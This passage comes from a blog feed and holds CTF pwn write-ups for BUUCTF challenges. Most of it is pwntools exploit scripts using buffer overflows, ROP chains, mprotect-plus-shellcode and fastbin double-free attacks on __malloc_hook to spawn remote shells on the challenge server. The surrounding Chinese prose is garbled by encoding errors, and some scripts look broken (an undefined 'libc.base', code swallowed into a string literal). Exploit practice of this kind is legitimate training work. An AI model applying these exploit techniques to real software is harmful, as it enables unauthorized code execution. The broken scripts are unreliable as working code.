class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./mulnote'</span>)</span><br><span class="line">elf = ELF(<span class="string">'mulnote'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">choice</span><span class="params">(achar)</span>:</span></span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,achar)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">add</span><span class="params">(size,con)</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'C'</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,str(size))</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'R'</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'E'</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,str(idx))</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="comment">########################leak libc#####################</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'1'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'A'</span>)</span><br><span class="line">show()</span><br><span class="line">libc = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-4</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"libc = %s"</span>%hex(libc))</span><br><span class="line">libc_base = libc - <span class="number">0x3c</span></span><br><span class="line">log.success(<span class="string">"libc_base = %s"</span>%hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + lib.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one = libc.base + <span class="number">0x45216</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook<span class="number">-0x23</span>)) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'7'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'x00'</span>*<span class="number">0x13</span>+p64(one)) <span class="comment">#8</span></span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'C'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'size&gt;'</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf pwnçš„åˆ·é¢˜ä¹‹æ—…ï¼ˆé•¿æœŸæ›´ï¼‰</title>
      <link href="/2019/10/18/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/"/>
      <url>/2019/10/18/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>åœ¨èº«è¾¹äººçš„æ¨èä¸‹ï¼Œæˆ‘ä¹Ÿè¸å…¥äº†buuçš„åˆ·é¢˜ä¹‹æ—…ï¼Œæ€€ç€ä¸€ä¸¢ä¸¢æ¿€åŠ¨ï¼Œè¿˜æœ‰äº›è®¸ä¸å®‰ï¼ˆæ¯•ç«Ÿèœï¼‰ï¼Œåœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹è‡ªå·±çš„åˆ·é¢˜ç»å†</p><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh =remote(<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20035</span>)</span><br><span class="line"><span class="comment">#sh = process('./warmup_csaw_2016')</span></span><br><span class="line"><span class="comment">#elf = ELF('./warmup_casw_2016')</span></span><br><span class="line">libc = ELF(<span class="string">'x64_libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(<span class="number">0x40060d</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./pwn1_sctf_2016')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20086</span>)</span><br><span class="line">payload = <span class="string">'I'</span>*<span class="number">19</span> + <span class="string">"a"</span> * <span class="number">7</span> + p32(<span class="number">0x08048F0D</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>è¿™é¢˜ï¼Œåˆ©ç”¨mrotectï¼Œä¿®æ”¹äº†å¯æ‰§è¡ŒåŒºåŸŸ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./not_the_same_3dsctf_2016')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20007</span>)</span><br><span class="line">elf = ELF(<span class="string">'./not_the_same_3dsctf_2016'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('x86_libc.so.6')</span></span><br><span class="line">pop2 = <span class="number">0x0806fcc9</span></span><br><span class="line">pop3 = <span class="number">0x0809e3e5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2D</span> + p32(elf.symbols[<span class="string">'mprotect'</span>]) </span><br><span class="line">payload += p32(pop3) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>)</span><br><span class="line">payload += p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">'read'</span>]) </span><br><span class="line">payload += p32(pop3) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>è¿™é¢˜çš„æ€è·¯å‘¢ï¼Œå’Œä¸Šé¢not_the_same_3dsctf_2016ç±»ä¼¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#sh = process("./get_started_3dsctf_2016")</span></span><br><span class="line">sh = remote(<span class="string">"pwn.buuoj.cn"</span>,<span class="number">20004</span>)</span><br><span class="line">elf = ELF(<span class="string">"get_started_3dsctf_2016"</span>)</span><br><span class="line">pop2_ret = <span class="number">0x0809a7dc</span></span><br><span class="line">pop3_ret = <span class="number">0x0804f460</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">56</span> + p32(elf.symbols[<span class="string">'mprotect'</span>]) + p32(pop3_ret) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>) + p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#input()</span></span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pop_rdi_ret = <span class="number">0x400793</span></span><br><span class="line">bss = <span class="number">0x0000000000601050</span></span><br><span class="line">elf = ELF(<span class="string">"ciscn_2019_n_1"</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20137</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(bss)+p64(elf.plt[<span class="string">'gets'</span>])</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(bss)+p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./ciscn_2019_en_2')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20123</span>)</span><br><span class="line">elf = ELF(<span class="string">'ciscn_2019_en_2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">main_addr = <span class="number">0x0000000000400B28</span></span><br><span class="line"><span class="comment">################### leak ####################</span></span><br><span class="line">sh.sendlineafter(<span class="string">'!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">payload += p64(pop_rdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(main_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'puts_addr='</span>+hex(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="comment">###################  shell  #############</span></span><br><span class="line">sh.sendlineafter(<span class="string">'!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(system_addr) </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./ciscn_2019_c_1')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20115</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">"x64_libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'!'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x50</span>+<span class="number">0x08</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_addr='</span>+hex(puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_addr + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload  = <span class="string">"\x00"</span> * (<span class="number">0x50</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h3><p>è¿™é¢˜çš„æ¼æ´ç‚¹å‘¢ï¼Œä¸»è¦åœ¨editçš„sizeç”±ä½ è‡ªå·±å†³å®šåˆå› ä¸ºdeleteè¿›è¡Œäº†0æ“ä½œï¼Œæ‰€ä»¥å¾—é€šè¿‡fakeï¼Œè®²ä¸€ä¸ªå †å—çš„æŒ‡é’ˆæŒ‡åˆ°unsoted binå †å—çš„åœ°æ–¹è¿›è¡Œè¯»å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = remote('pwn.buuoj.cn',20001)</span></span><br><span class="line">sh = process(<span class="string">'./babyheap_0ctf_2017'</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"babyheap_0ctf_2017"</span>)</span><br><span class="line">libc = ELF(<span class="string">"x64_libc.so.6"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"4"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"><span class="comment">############### leak libc_base + malloc_hook#########</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">3</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base='</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'malloc_hook ='</span> + hex (malloc_hook))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="comment">################## </span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#malloc to malloc_hook nearby</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment">#allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4</span></span><br><span class="line"></span><br><span class="line">// edit idx4<span class="string">'s fd point to fake chunk</span></span><br><span class="line"><span class="string">payload = p64(malloc_hook - 35)</span></span><br><span class="line"><span class="string">edit(2,len(payload),payload)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">one_gadget = 0x4526a</span></span><br><span class="line"><span class="string">payload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + one_gadget)</span></span><br><span class="line"><span class="string">edit(6,len(payload),payload)</span></span><br></pre></td></tr></table></figure><h3 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./babyfengshui_33c3_2016')</span></span><br><span class="line">sh = remote(<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20002</span>)</span><br><span class="line">elf = ELF(<span class="string">"babyfengshui_33c3_2016"</span>)</span><br><span class="line">libc = ELF(<span class="string">"x86_libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name_size,name,text_size,text)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"size of description: "</span>)</span><br><span class="line">sh.sendline(str(name_size))</span><br><span class="line">sh.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">sh.sendline(name)</span><br><span class="line">sh.recvuntil(<span class="string">"text length: "</span>)</span><br><span class="line">sh.sendline(str(text_size))</span><br><span class="line">sh.recvuntil(<span class="string">"text:"</span>)</span><br><span class="line">sh.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,text,size)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(<span class="string">"text length: "</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(<span class="string">"text: "</span>)</span><br><span class="line">sh.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span 